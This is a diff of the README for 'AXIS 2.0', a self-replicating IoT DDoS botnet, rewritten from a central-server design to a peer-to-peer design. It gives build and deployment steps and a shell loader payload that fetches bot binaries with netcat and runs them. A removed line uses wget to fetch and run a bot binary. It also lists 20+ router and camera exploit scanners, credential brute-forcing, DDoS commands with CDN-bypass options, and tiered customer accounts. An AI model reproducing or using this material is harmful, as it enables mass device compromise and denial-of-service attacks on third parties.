@@ -1,681 +1,330 @@
-# AXIS 2.0 Botnet - Complete Documentation
+# AXIS 2.0 P2P - Complete Documentation
 
-**Advanced DDoS botnet framework with self-replication, 16 attack methods, and 23 exploit scanners**
+## Overview
+
+AXIS 2.0 P2P is a fully decentralized peer-to-peer botnet using **torrent-style binary distribution**. Every bot simultaneously executes DDoS attacks, self-replicates via 20+ exploit scanners, and **seeds ALL bot binaries** to newly infected devices — exactly like a BitTorrent swarm where every peer is a seeder.
+
+### Key Design Principles (from `how it should work.txt`)
+
+1. **Torrent-style P2P distribution**: Bots download ALL binaries from the P2P network, not from a central HTTP server. Every bot is a seeder.
+2. **Self-replication built-in**: All scanners from `scanners-exploits/` are integrated into every bot binary. Every infected device immediately starts scanning for new targets.
+3. **CNC joins via proxies**: The C&C server doesn't expose its real IP. It joins the P2P network through proxy peers to spread attack commands while staying shielded.
+4. **Auto-seed control**: CNC stops seeding binaries when the network reaches 200 bots. If the network dips below 200, it resumes seeding.
+5. **Every bot = seeder + attacker**: Bots serve binaries to peers while executing attacks and running scanners simultaneously.
+
+## Architecture
+
+```
+┌──────────────────────────────────────────────────────────────────┐
+│                      BOT INSTANCE                                 │
+│                                                                    │
+│  Parent Process                                                    │
+│  ├─ Attack System (24 methods: L4, L7, AMP, TCP, ICMP, GRE)      │
+│  ├─ P2P Command Network (UDP 49152)                               │
+│  ├─ P2P File Seeder (UDP 49153) ← TORRENT-STYLE                  │
+│  │   └─ Serves ALL 13 axis.* binaries to peers                   │
+│  ├─ Self-Replication Engine                                       │
+│  │   ├─ Telnet Scanner (port 23, 90+ credentials)                │
+│  │   ├─ SSH Scanner (port 22)                                     │
+│  │   └─ 20+ Exploit Scanners (routers, IoT, cameras)             │
+│  ├─ CNC Connection (optional, TLS port 443)                      │
+│  └─ Killer Module (anti-competing malware)                        │
+│                                                                    │
+│  Every bot is BOTH a seeder AND an attacker                       │
+└──────────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────────┐
+│                    C&C SERVER                                      │
+│                                                                    │
+│  ├─ TLS Bot Listener (port 443) - traditional bots                │
+│  ├─ Admin Panel (port 6969, TLS)                                  │
+│  ├─ REST API (port 3779)                                          │
+│  └─ P2P Injector                                                  │
+│      ├─ Joins network via PROXY peers (shields CNC IP)           │
+│      ├─ Sends attack commands through P2P                        │
+│      └─ Auto-seed control:                                        │
+│          • Bots >= 200 → STOP seeding binaries                   │
+│          • Bots < 200  → RESUME seeding binaries                 │
+└──────────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────────┐
+│                    SEEDER SERVICE (Go)                             │
+│                                                                    │
+│  Standalone tool to continuously seed attack commands            │
+│  into the P2P network (torrent-style propagation)                │
+│                                                                    │
+│  Usage: ./seeder_server <method> <target> <duration>             │
+└──────────────────────────────────────────────────────────────────┘
+```
+
+## Components
+
+### 1. Bot (`bot/`)
+
+**Source Files:**
+| File | Purpose |
+|------|---------|
+| `main.c` | Entry point, P2P init, selfrep init, CNC handler |
+| `attack.c/h` | 24 attack implementations |
+| `p2p.c/h` | P2P UDP command protocol + peer discovery |
+| `p2pfile.c/h` | **Torrent-style binary seeding** (every bot is a seeder) |
+| `selfrep.c/h` | **Integrated self-replication** (20+ scanners) |
+| `killer.c/h` | Anti-malware competitor killer |
+| `checksum.c/h` | IP/ICMP/TCP checksums |
+| `resolv.c/h` | DNS resolution |
+| `rand.c/h` | PRNG |
+| `table.c/h` | Encrypted string table |
+| `util.c/h` | Utilities |
+| `protocol.h` | Network protocol structures |
+| `includes.h` | Common includes |
+| `config.h` | Build configuration |
+
+**Architectures (13):** arm, arm5, arm6, arm7, mips, mpsl, x86, x86_64, ppc, spc, m68k, sh4, arc
+
+**Configuration (`bot/config.h`):**
+```c
+#define CNC_ADDR "YOUR_VPS_IP"
+#define P2P_PORT 49152
+#define P2P_FILE_PORT 49153
+#define P2P_MAX_PEERS 256
+#define P2P_SEEDS ""              // Empty = broadcast auto-discovery
+#define SCAN_CB_PORT 9555
+#define SINGLE_INSTANCE_PORT 23455
+#define KILLER
+#define SELFREP                   // Self-replication enabled
+```
+
+### 2. Torrent-Style P2P Distribution
+
+**How it works:**
+1. Bot starts up, discovers peers via seeds or broadcast
+2. Downloads ALL 13 `axis.*` binaries from any peer (UDP 49153)
+3. Stores binaries in memory AND on disk (`/tmp/axis.*`)
+4. Becomes a **seeder** — serves binaries to other requesting bots
+5. Starts self-replication scanners to find new devices
+6. Every new infection downloads binaries from the P2P swarm
+
+**File Protocol (UDP 49153):**
+```
+Request:  [0x20][chunk_id_low][chunk_id_high][filename (31 bytes)]
+Response: [0x21][chunk_id_low][chunk_len_low][chunk_len_high][data...]
+```
+
+Chunk size: 4096 bytes. Max 256 chunks per binary (1MB max).
+
+**Auto-redownload:** Every 5 minutes, bots check if they're missing any binaries and re-download from peers.
+
+### 3. Self-Replication (Integrated into Every Bot)
+
+All scanners from `scanners-exploits/` are now built into `bot/selfrep.c`:
+
+**Telnet Scanner:** Port 23, 90+ credentials
+**SSH Scanner:** Port 22, 16+ credentials
+**Exploit Scanners (20+):**
+- Huawei SOAP RCE (port 37777)
+- Zyxel CGI command injection
+- DVR/NVR camera backdoor
+- Zhone ONT/OLT exploit
+- Fiber/GPON exploit (GPON form diag)
+- ADB UPnP RCE (port 5555)
+- D-Link SOAP/command injection
+- HiLink exploit
+- XiongMai camera (port 34567)
+- ASUS router exploit
+- JAWS web server format string
+- Linksys WRT command injection
+- Linksys port 8080
+- HNAP1 SOAP RCE
+- Netlink router exploit
+- TR-064 SOAP RCE
+- Realtek SDK UPnP exploit
+- ThinkPHP framework RCE
+- Telnet auth bypass
+- GPON scanner
+- GoAhead web server exploit
+
+**Scanner rotation:** Every 60 seconds, the bot rotates between telnet, SSH, and exploit scanning modes.
+
+**Infection reporting:** Successful infections are reported to the scan callback listener (UDP `SCAN_CB_PORT`) in format: `IP(4) + port(2) + userlen(1) + user + passlen(1) + pass`.
+
+### 4. C&C Server (`cnc/`)
+
+**Proxy-Based Command Injection:**
+The CNC doesn't send commands directly to bots. Instead, it joins the P2P network through **proxy peers** to shield its real IP address.
+
+```go
+// In admin.go:
+proxies := []string{
+    // Add proxy peer IPs here to shield CNC IP
+    // "proxy1:49152", "proxy2:49152",
+}
+injector := NewP2PInjector(p2pSeeds, proxies)
+injector.SendAttack(buf)
+```
+
+**Auto-Seeding Control:**
+```go
+const SEED_THRESHOLD = 200  // Stop seeding when bots >= 200
+const SEED_RESUME = 200     // Resume seeding when bots < 200
+```
+
+When an attack is launched:
+- If bot count >= 200: Attack commands only (no binary seeding)
+- If bot count < 200: Attack commands + binary seeding active
+
+**Torrent-Style Peer Discovery:**
+The CNC can auto-discover peers like torrent DHT:
+```go
+discovered := injector.DiscoverPeers()
+// Sends PING to seeds, collects PONG responses with peer lists
+```
+
+### 5. Seeder Service (`seeder/`)
+
+**Written in Go.** Standalone tool for continuously seeding attack commands into the P2P network.
+
+**Usage:**
+```bash
+./seeder_server axis-l7 1.2.3.4 300
+# Continuously re-seeds every 10 seconds
+```
+
+**Methods supported:** All 24 attack methods
+
+### 6. Loader (`loader/`)
+
+**Updated for torrent-style distribution.** Instead of serving binaries via HTTP, the loader sends P2P download payloads to infected devices.
+
+**P2P Download Payload:**
+```bash
+cd /tmp;
+for arch in arm arm5 arm6 arm7 mips mpsl x86 x86_64 ppc spc m68k sh4 arc; do
+    rm -f axis.$arch;
+    chunk=0;
+    while true; do
+        printf '\x20\x$(printf "%02x" $((chunk % 256)))\x$(printf "%02x" $((chunk / 256)))$arch' | \
+        nc -u -w2 SEED_IP 49153 >> axis.$arch 2>/dev/null;
+        chunk=$((chunk + 1));
+        if [ $chunk -gt 256 ]; then break; fi;
+    done;
+    chmod +x axis.$arch 2>/dev/null;
+done;
+for arch in arm arm5 arm6 arm7 mips mpsl x86 x86_64 ppc spc m68k sh4 arc; do
+    test -s axis.$arch && ./axis.$arch &
+done
+```
+
+### 7. Python Loader (`loader_py/`)
+
+Alternative Python-based loader. Same P2P torrent-style distribution.
+
+### 8. Scan Listener (`scanListen.go`)
+
+Receives infection reports from bots. Outputs to `telnet.txt`.
+
+### 9. P2P Controller (`p2p_ctrl.py`)
+
+Python CLI for sending attack commands via P2P.
+
+## Build Instructions
+
+```bash
+chmod +x build.sh build_relay.sh build_scanners.sh
+./build.sh           # Bots (13 archs), C&C, loader, DLRs, Seeder
+./build_relay.sh     # P2P relay server
+./build_scanners.sh  # Standalone scanners (legacy, not needed for torrent mode)
+```
+
+**Output:**
+```
+bins/axis.*          # Bot binaries (13 architectures, with selfrep)
+bins/dlr.*           # Downloaders
+cnc_server           # C&C server
+seeder_server        # P2P attack command seeder
+relay_server         # P2P relay server
+loader               # Telnet loader
+```
+
+## Deployment
+
+### 1. Configure Seed Peers
+
+Edit these files:
+- `bot/config.h` → `P2P_SEEDS "VPS1:49152,VPS2:49152"` (or leave empty for broadcast)
+- `cnc/admin.go` → `p2pSeeds` and `proxies`
+- `relay/config.go` → `seedPeers`
+
+### 2. Start C&C Server
+```bash
+sudo ./cnc_server
+# Configure proxy peers in admin.go to shield CNC IP
+```
+
+### 3. Start Seeder (Optional)
+```bash
+./seeder_server axis-l7 target.com 300
+# Continuously seeds attack commands every 10 seconds
+```
+
+### 4. Initial Infection
+```bash
+./loader
+# Feed: IP:PORT username:password [arch]
+# Infected devices download binaries via P2P torrent from existing bots
+```
+
+### 5. Launch Attacks
+```bash
+# Via C&C admin panel (port 6969)
+openssl s_client -connect CNC_IP:6969 -quiet
+
+# Via seeder
+./seeder_server axis-l7 target.com 300
+
+# Via P2P controller
+python3 p2p_ctrl.py axis-l7 target.com 300
+```
+
+## Monitoring
+
+```bash
+# P2P activity
+tcpdump -i any -n udp port 49152  # Commands
+tcpdump -i any -n udp port 49153  # File transfers
+
+# Bot processes
+ps aux | grep axis
+
+# Scan results
+tail -f telnet.txt
+
+# CNC logs
+cat logs/commands.txt
+cat logs/logins.txt
+```
+
+## Ports Summary
+
+| Port | Protocol | Purpose |
+|------|----------|---------|
+| 443 | TCP/TLS | C&C bot connections |
+| 6969 | TCP/TLS | Admin panel / Relay |
+| 3779 | TCP/HTTP | REST API |
+| 49152 | UDP | P2P command propagation |
+| 49153 | UDP | P2P binary seeding (torrent-style) |
+| 9555 | TCP | Scan result callback |
+| 23455 | TCP | Single instance lock |
+
+## Security
+
+**Before deployment:**
+1. Change default passwords (`admin123` in `cnc/database.json` and `relay/config.go`)
+2. Set real seed peer IPs in all config files
+3. Configure proxy peers in `cnc/admin.go` to shield CNC IP
+4. Set `CNC_ADDR` in `bot/config.h`
 
 ---
 
-## ⚠️ IMPORTANT NOTICE
-
-This is **SOURCE CODE ONLY** - not a finished product. You must:
-1. Install all dependencies (Go 1.21+, GCC, cross-compilers)
-2. Configure all settings for your environment (change ALL `0.0.0.0` placeholders)
-3. Compile all components
-4. Set up infrastructure (Apache/Nginx, TFTP)
-5. Test thoroughly before any deployment
-
-**This software is for EDUCATIONAL PURPOSES ONLY.** Unauthorized use is illegal.
-
----
-
-## 📋 Requirements
-
-### Build Environment
-- **OS**: Linux (Ubuntu 20.04+ / Debian 11+ / CentOS 8+)
-- **Go**: 1.21+ (for C&C server and all extrascanners)
-- **GCC**: With cross-compilation toolchains (for bot binaries)
-- **No Database Required**: JSON file-based database (automatic)
-
-### Infrastructure
-- **Web Server**: Apache/Nginx (binary hosting on port 80)
-- **TFTP Server**: tftpd-hpa (alternative download method on port 69/UDP)
-- **FTP Server**: vsftpd (optional, additional download method)
-
-### Minimum Hardware
-- 2GB RAM (4GB+ recommended)
-- 20GB disk space
-- 1Gbps network connection
-- Public IP address
-- DDoS-protected hosting (recommended)
-
----
-
-## 🎯 Features Overview
-
-### Core Capabilities
-- **23 Self-Replication Scanners** - Bot self-infection via multiple exploit vectors
-- **7 Server-Side Scanners** - External Go-based bot loaders
-- **16 Attack Methods** - 9 Layer 4 + 5 Amplification + 2 Layer 7 DDoS attacks
-- **Modern Admin Panel** - Cyan/white/yellow TLS-encrypted telnet interface
-- **REST API** - JSON API on port 3779 for remote control
-- **JSON Database System** - File-based user management with 4 tiers (Basic/Premium/VIP/Admin)
-- **Multi-Architecture** - Bot binaries for 13 CPU architectures
-
-### Attack Arsenal
-
-#### Layer 4 Attacks (9 methods)
-1. **TCP Flood** - Raw TCP SYN flood optimized for Gbps
-2. **UDP Flood** - Raw UDP flood optimized for Gbps
-3. **OVH TCP** - TCP with OVH Game bypass (SYN+ACK+PSH+URG flags)
-4. **OVH UDP** - UDP with OVH Game bypass (DNS-like headers)
-5. **ICMP Ping Flood** - ICMP Echo Request flood
-6. **GRE IP** - GRE encapsulated IP flood
-7. **GRE ETH** - GRE encapsulated Ethernet flood
-8. **AXIS-TCP** - All-in-one TCP + AMP methods + ICMP flood
-9. **AXIS-UDP** - All-in-one UDP + AMP methods + ICMP flood
-
-#### Amplification Attacks (5 methods)
-10. **DNS Amplification** - 50x-100x amplification factor
-11. **NTP Amplification** - 100x-500x amplification factor
-12. **SSDP Amplification** - 30x-50x amplification factor
-13. **SNMP Amplification** - 50x-100x amplification factor
-14. **CLDAP Amplification** - 50x-70x amplification factor
-
-#### Layer 7 Attacks (2 methods)
-15. **http** - http flood optimized for requests per second
-16. **AXIS L7** - Advanced multi-layer bypass (CF, Akamai, WAF) with 10 rotating user-agents, session management, response analysis
-
-### Self-Replication Scanners (23 Bot-Based - All Unique)
-
-| # | Scanner | Port | Exploit Type | Target Devices |
-|---|---------|------|--------------|----------------|
-| 1 | **Telnet** | 23 | Brute-force (270+ creds) | IoT devices, routers, cameras |
-| 2 | **SSH** | 22 | Brute-force (100+ creds) | Cloud providers (AWS, DO, Linode, Vultr) |
-| 3 | **Huawei** | 37215 | SOAP RCE | Huawei ISP routers |
-| 4 | **Zyxel** | 8080 | Command injection | Zyxel SOHO routers |
-| 5 | **ThinkPHP** | 80 | RCE | ThinkPHP web applications |
-| 6 | **Realtek** | 52869 | UPnP RCE | Realtek chip routers (TP-Link, D-Link) |
-| 7 | **GPON** | 80/8080 | Command injection | FTTH/GPON ONT devices |
-| 8 | **Telnet Bypass** | 23 | Auth bypass (`-f root`) | IoT with telnet auth bypass |
-| 9 | **DVR** | 80 | XML injection (NTP server) | CCTV/DVR cameras (Hi3520-based) |
-| 10 | **Zhone** | 80 | Ping diagnostic injection | Zhone ONT/OLT fiber routers |
-| 11 | **XiongMai** | 34599 | CVE-2017-16724 | XiongMai IP cameras |
-| 12 | **Hilink** | 80 | Command injection | Hilink LTE routers |
-| 13 | **ASUS** | 80 | Command injection | ASUS RT-AC routers |
-| 14 | **Fiber/GPON** | 80 | Boa server formTracert | GPON/ONT fiber routers |
-| 15 | **ADB** | 5555 | UPnP SOAP injection | Android TV boxes, emulators |
-| 16 | **D-Link** | 80 | HNAP exploit | D-Link routers |
-| 17 | **JAWS** | 80 | HTTP server exploit | JAWS web servers |
-| 18 | **GoAhead** | 81 | CGI exploit | GoAhead web servers |
-| 19 | **Linksys** | 55555 | SOAP exploit | Linksys routers |
-| 20 | **Linksys8080** | 8080 | HTTP exploit | Linksys routers |
-| 21 | **HNAP** | 8081 | HNAP SOAP exploit | HNAP devices |
-| 22 | **Netlink** | 1723 | PPTP exploit | Netlink devices |
-| 23 | **TR-064** | 7547 | CWMP exploit | TR-064 routers |
-
-### Server-Side Scanners (7 Go-Based)
-
-| # | Scanner | Target | Method |
-|---|---------|--------|--------|
-| 1 | **telnet-scanner** | IoT devices | Mass telnet brute-force with CIDR support |
-| 2 | **0day-exploit** | Routers | Command injection vulnerabilities |
-| 3 | **realtek-loader** | SOHO routers | Realtek UPnP RCE (port 52869) |
-| 4 | **randox86** | Cloud/VPS | `/admin/service/run` JSON command injection |
-| 5 | **fiber** | GPON/ONT | Boa server `/boaform/admin/formTracert` |
-| 6 | **dvr** | CCTV/DVR | XML NTP server injection |
-| 7 | **zhone** | FTTH/ONT | Ping diagnostic `ipAddr` parameter injection |
-
----
-
-## 📁 Complete Directory Structure
-
-```
-AXIS 2.0/
-├── cnc/                          # Command & Control server (Go)
-│   ├── main.go                   # Main server, TLS, API
-│   ├── admin.go                  # Admin panel handler
-│   ├── attack.go                 # Attack parsing (16 methods)
-│   ├── bot.go                    # Bot connection handling
-│   ├── clientList.go             # Bot management
-│   ├── database.go               # MySQL integration
-│   └── api.go                    # REST API
-│
-├── extrascanners/                # Server-side scanners (Go)
-│   ├── telnet-scanner.go         # Mass telnet brute-force
-│   ├── 0day-exploit.go           # 0-day exploit scanner
-│   ├── realtek-loader.go         # Realtek UPnP loader
-│   ├── randox86.go               # Randox86 command injection
-│   ├── fiber.go                  # Fiber/GPON Boa server exploit
-│   ├── dvr.go                    # DVR/CCTV XML injection
-│   ├── zhone.go                  # Zhone ONT/OLT ping exploit
-│   ├── run-all.sh                # Run all 7 simultaneously
-│   ├── randox86-valid.txt        # Randox86 target list (2047 URLs)
-│   ├── fiber-targets.txt         # Fiber target template
-│   ├── dvr-targets.txt           # DVR target template
-│   └── zhone-targets.txt         # Zhone target template
-│
-├── bot/                          # Bot malware source (C)
-│   ├── main.c                    # Main bot loop
-│   ├── attack.c/h                # 16 attack methods
-│   ├── scanner.c/h               # Telnet brute-force (270+ creds)
-│   ├── killer.c/h                # Anti-malware killer
-│   ├── ssh.c/h                   # SSH brute-force (100+ creds)
-│   ├── huawei.c/h                # Huawei SOAP RCE
-│   ├── zyxel.c/h                 # Zyxel command injection
-│   ├── thinkphp.c/h              # ThinkPHP RCE
-│   ├── realtek.c/h               # Realtek UPnP exploit
-│   ├── gpon_scanner.c/h          # GPON exploit (80 & 8080)
-│   ├── telnetbypass.c/h          # Telnet auth bypass
-│   ├── dvr.c/h                   # DVR camera XML injection
-│   ├── zhone.c/h                 # Zhone ONT/OLT
-│   ├── xm.c/h                    # XiongMai CVE-2017-16724
-│   ├── hilink.c/h                # Hilink LTE router exploit
-│   ├── asus.c/h                  # ASUS router exploit
-│   ├── fiber.c/h                 # Fiber/GPON Boa server
-│   ├── adb.c/h                   # ADB Android Debug Bridge
-│   ├── dlink.c/h                 # D-Link HNAP exploit
-│   ├── jaws.c/h                  # JAWS HTTP server exploit
-│   ├── goahead_scan.c/h          # GoAhead CGI exploit
-│   ├── linksys.c/h               # Linksys SOAP exploit (55555)
-│   ├── linksys8080.c/h           # Linksys HTTP exploit (8080)
-│   ├── hnap.c/h                  # HNAP SOAP exploit (8081)
-│   ├── netlink.c/h               # Netlink PPTP exploit
-│   ├── tr064.c/h                 # TR-064 CWMP exploit
-│   ├── config.h                  # Bot configuration
-│   ├── table.c/h                 # String table (XOR encrypted)
-│   └── [util files...]
-│
-├── loader/                       # Telnet loader (C)
-│   ├── main.c                    # Main loader
-│   ├── server.c/h                # Server management
-│   ├── connection.c/h            # Connection handling
-│   ├── binary.c/h                # Binary payloads
-│   ├── telnet_info.c/h           # Telnet parsing
-│   └── config.h                  # Loader config
-│
-├── dlr/                          # Downloader (C)
-│   ├── main.c                    # Minimal ELF downloader (~4KB)
-│   └── dlr.h                     # Downloader config
-│
-├── build.sh                      # Unified build script
-├── database.sql                  # MySQL schema
-├── scanListen.go                 # Scan result listener (port 9555)
-├── README.md                     # This file
-├── QUICK_SETUP.txt               # Quick installation guide
-├── TROUBLESHOOTING.txt           # Troubleshooting guide
-├── ULTIMATE_L4_README.md         # ULTIMATE L4 documentation (renamed to AXIS-L4_README.md)
-└── ULTIMATE_L7_README.md         # ULTIMATE L7 documentation (renamed to AXIS-L7_README.md)
-```
-
----
-
-## 🔨 Building All Components
-
-### 1. Install Dependencies
-
-```bash
-# Ubuntu/Debian
-sudo apt update
-sudo apt install -y golang-go gcc mysql-server apache2 tftpd-hpa build-essential
-
-# Cross-compilers (for multi-architecture bot binaries)
-sudo apt install -y \
-    gcc-arm-linux-gnueabi \
-    gcc-arm-linux-gnueabihf \
-    gcc-aarch64-linux-gnu \
-    gcc-mips-linux-gnu \
-    gcc-mipsel-linux-gnu \
-    gcc-powerpc-linux-gnu \
-    gcc-sparc64-linux-gnu \
-    gcc-m68k-linux-gnu \
-    gcc-sh4-linux-gnu \
-    gcc-arc-linux-gnu
-```
-
-### 2. Configure All Components
-
-**CRITICAL**: All configuration files use `0.0.0.0` as a placeholder. You MUST change these to your server IP before building!
-
-```bash
-# Quick IP change for all bot files
-SERVER_IP="YOUR.SERVER.IP.HERE"
-sed -i "s/0.0.0.0/$SERVER_IP/g" bot/config.h bot/table.c loader/config.h dlr/dlr.h
-```
-
-### 3. Build Everything
-
-```bash
-chmod +x build.sh
-./build.sh
-```
-
-This builds:
-- C&C server (`cnc_server`)
-- Scan listener (`scanListen`)
-- 7 extrascanners (Go-based)
-- Bot binaries for 13 architectures
-- Telnet loader
-- Downloaders for all architectures
-
-**Note**: The JSON database (`cnc/database.json`) is created automatically on first run with a default admin user.
-
----
-
-## 🚀 Running the Botnet
-
-### Start Core Services
-
-```bash
-# Terminal 1: C&C Server (bots connect on 3778, admin on 3777 TLS)
-./cnc_server
-
-# Terminal 2: Scan Listener (receives results from bot scanners)
-./scanListen
-
-# Terminal 3: Loader (feed IPs via stdin)
-./loader < list.txt
-```
-
-**Note**: The database.json file will be created automatically in the `cnc/` directory on first run.
-
-### Run Server-Side Scanners
-
-```bash
-# Run all 7 scanners simultaneously (RECOMMENDED)
-cd extrascanners
-./run-all.sh YOUR_SERVER_IP 1000
-
-# Or run individual scanners
-./extrascanners/telnet-scanner leaks/10.lst 1000
-./extrascanners/0day-exploit leaks/CF-Rules-1.txt YOUR_SERVER_IP 500
-./extrascanners/realtek-loader b4ckdoorarchive/RANDOM.LST/realtek.lst YOUR_SERVER_IP 1000
-./extrascanners/randox86 randox86-valid.txt "wget http://YOUR_IP/bins/axis.x86;chmod +x /tmp/a;/tmp/a" 500
-./extrascanners/fiber fiber-targets.txt YOUR_SERVER_IP 500
-./extrascanners/dvr dvr-targets.txt YOUR_SERVER_IP 500
-./extrascanners/zhone zhone-targets.txt YOUR_SERVER_IP 500
-```
-
-### Connect to Admin Panel
-
-```bash
-# TLS-encrypted telnet connection
-openssl s_client -connect YOUR_SERVER_IP:3777 -quiet
-
-# Login with default credentials
-# Username: admin
-# Password: admin123
-# ⚠️ CHANGE THIS IMMEDIATELY!
-```
-
-### Use REST API
-
-```bash
-# Get botnet status
-curl http://YOUR_SERVER_IP:3779/api/botnet/status
-
-# Launch attack (requires API key)
-curl -H "Authorization: Bearer YOUR_API_KEY" \
-     -X POST http://YOUR_SERVER_IP:3779/api/attack \
-     -d '{"target":"1.2.3.4","duration":300,"method":"ultimate-l4"}'
-```
-
----
-
-## ⚔️ Attack Method Reference
-
-### Layer 4 Attack Commands
-
-```bash
-# TCP Flood
-!tcp <ip> <duration> len=1400 dport=80
-
-# UDP Flood
-!udp <ip> <duration> len=1400 dport=53
-
-# OVH TCP Bypass
-!ovhtcp <ip> <duration> len=1400 dport=27015
-
-# OVH UDP Bypass
-!ovhudp <ip> <duration> len=1400 dport=27015
-
-# ICMP Ping Flood
-!icmp <ip> <duration> len=64
-
-# GRE IP Flood
-!greip <ip> <duration> dport=80
-
-# GRE Ethernet Flood
-!greeth <ip> <duration> dport=80
-
-# AXIS-L4 (Combined)
-!axis-l4 <ip> <duration> len=1400 dport=80
-
-# ULTIMATE L4 (All-in-One with IP spoofing)
-!ultimate-l4 <ip> <duration> len=1400 dport=80
-```
-
-### Amplification Attack Commands
-
-```bash
-# DNS Amplification
-!dns <ip> <duration>
-
-# NTP Amplification
-!ntp <ip> <duration>
-
-# SSDP Amplification
-!ssdp <ip> <duration>
-
-# SNMP Amplification
-!snmp <ip> <duration>
-
-# CLDAP Amplification
-!cldap <ip> <duration>
-```
-
-### Layer 7 Attack Commands
-
-```bash
-# HTTP Flood
-!http https://example.com/ 300 method=GET conns=100
-
-# AXIS-L7 (Browser emulation)
-!axis-l7 https://target.com/ 300 domain=target.com
-
-# ULTIMATE L7 (Advanced bypass with session management)
-!ultimate-l7 https://protected.site/ 300 domain=protected.site.com cookies="cf_clearance=TOKEN"
-```
-
----
-
-## 📊 Attack Method Comparison
-
-| Method | Type | Vectors | IP Spoofing | Bypass | Best For |
-|--------|------|---------|-------------|--------|----------|
-| tcp | L4 | TCP | ❌ | ❌ | Basic TCP flood |
-| udp | L4 | UDP | ❌ | ❌ | Basic UDP flood |
-| ovhtcp | L4 | TCP | ❌ | ✅ | OVH Game bypass |
-| ovhudp | L4 | UDP | ❌ | ✅ | OVH UDP bypass |
-| icmp | L4 | ICMP | ❌ | ❌ | Layer 3 attack |
-| axis-l4 | L4 | TCP+UDP+ICMP | ❌ | ✅ | Combined L4 |
-| greip | L4 | GRE-IP | ✅ (inner) | ✅ | Encapsulation |
-| greeth | L4 | GRE-ETH | ✅ (inner) | ✅ | Triple encapsulation |
-| **ultimate-l4** | L4 | **ALL 5** | ✅ | ✅ | **Maximum L4** |
-| dns | Amp | DNS | ✅ | ✅ | 50-100x amplification |
-| ntp | Amp | NTP | ✅ | ✅ | 100-500x amplification |
-| ssdp | Amp | SSDP | ✅ | ✅ | 30-50x amplification |
-| snmp | Amp | SNMP | ✅ | ✅ | 50-100x amplification |
-| cldap | Amp | CLDAP | ✅ | ✅ | 50-70x amplification |
-| http | L7 | HTTP | ❌ | ❌ | Basic HTTP flood |
-| axis-l7 | L7 | HTTP | ❌ | ✅ | Cloudflare bypass |
-| **ultimate-l7** | L7 | HTTP | ✅ (headers) | ✅ | **Advanced L7** |
-
----
-
-## 🌍 Scanner Target Coverage
-
-### Bot Self-Replication Scanners (14)
-
-| Scanner | Asia | Europe | N.America | S.America | Africa | M.East | Oceania |
-|---------|------|--------|-----------|-----------|--------|--------|---------|
-| Telnet | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
-| SSH | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| Huawei | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
-| Zyxel | ✓ | ✓ | ✓ | ✓ | - | ✓ | ✓ |
-| ThinkPHP | ✓ | ✓ | ✓ | - | - | - | ✓ |
-| Realtek | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| GPON | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| TelnetBypass | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
-| DVR | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| Zhone | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| XM | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| Hilink | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| ASUS | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| Fiber | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-
-### Server-Side Scanners (7)
-
-| Scanner | Input Format | Credentials | Payload |
-|---------|--------------|-------------|---------|
-| telnet-scanner | IP list, CIDR | 270+ telnet combos | axis.$(uname -m) |
-| 0day-exploit | IP list, CIDR | N/A | axis.$(uname -m) |
-| realtek-loader | IP list, CIDR, URL | N/A | axis.mips |
-| randox86 | URL list (2047) | N/A | axis.x86 |
-| fiber | IP list | N/A | axis.mips |
-| dvr | IP list | 35 DVR combos | axis.mips |
-| zhone | IP list | 6 Zhone combos | axis.mips |
-
----
-
-## 🔧 Configuration Files Reference
-
-### ⚠️ CRITICAL: Change ALL 0.0.0.0 Placeholders
-
-| File | Setting | Default | Change To |
-|------|---------|---------|-----------|
-| `bot/config.h` | CNC_ADDR | 0.0.0.0 | Your C&C server IP |
-| `bot/config.h` | HTTP_SERVER | 0.0.0.0 | Your HTTP server IP |
-| `bot/config.h` | HTTP_SERVER_IP | 0.0.0.0 | Your HTTP server IP |
-| `bot/config.h` | TFTP_SERVER | 0.0.0.0 | Your TFTP server IP |
-| `bot/table.c` | TABLE_CNC_DOMAIN | 0.0.0.0 | Your C&C server IP |
-| `loader/config.h` | HTTP_SERVER | 0.0.0.0 | Your HTTP server IP |
-| `loader/config.h` | TFTP_SERVER | 0.0.0.0 | Your TFTP server IP |
-| `dlr/dlr.h` | HTTP_SERVER | 0.0.0.0 | Your HTTP server IP |
-| `scanListen.go` | scanListenAddr | 0.0.0.0:9555 | Keep (listens on all) |
-
-### Quick Configuration Script
-
-```bash
-#!/bin/bash
-SERVER_IP="YOUR.SERVER.IP.HERE"
-
-# Update all bot files
-sed -i "s/CNC_ADDR \"0.0.0.0\"/CNC_ADDR \"$SERVER_IP\"/" bot/config.h
-sed -i "s/HTTP_SERVER \"0.0.0.0\"/HTTP_SERVER \"$SERVER_IP\"/" bot/config.h
-sed -i "s/HTTP_SERVER_IP \"0.0.0.0\"/HTTP_SERVER_IP \"$SERVER_IP\"/" bot/config.h
-sed -i "s/0.0.0.0/$SERVER_IP/g" bot/table.c loader/config.h dlr/dlr.h
-
-echo "Configuration updated with server IP: $SERVER_IP"
-```
-
----
-
-## 📡 Network Ports
-
-| Port | Protocol | Service | Purpose |
-|------|----------|---------|---------|
-| 22 | TCP | SSH | Admin server access |
-| 80 | TCP | HTTP | Binary hosting (web server) |
-| 69 | UDP | TFTP | Alternative binary download |
-| 3777 | TCP | TLS Telnet | Admin panel (encrypted) |
-| 3778 | TCP | TCP | Bot connections |
-| 3779 | TCP | HTTP | REST API |
-| 9555 | TCP | TCP | Scan results listener |
-
----
-
-## 🗄️ JSON Database System
-
-### Overview
-
-AXIS 2.0 uses a **JSON file-based database** (`cnc/database.json`) instead of MySQL. All user data, attack history, and settings are stored in a single file.
-
-### Account Tiers
-
-| Tier | Max Duration | Max Bots | Attack Methods |
-|------|-------------|----------|----------------|
